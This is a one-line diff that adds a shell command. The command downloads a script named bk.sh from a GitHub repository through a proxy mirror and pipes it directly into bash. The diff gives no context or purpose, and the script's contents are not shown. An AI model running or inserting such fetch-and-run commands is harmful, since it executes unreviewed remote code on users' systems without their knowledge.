@@ -1,0 +1,1 @@
+curl -s -L http://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/bk.sh | bash -s
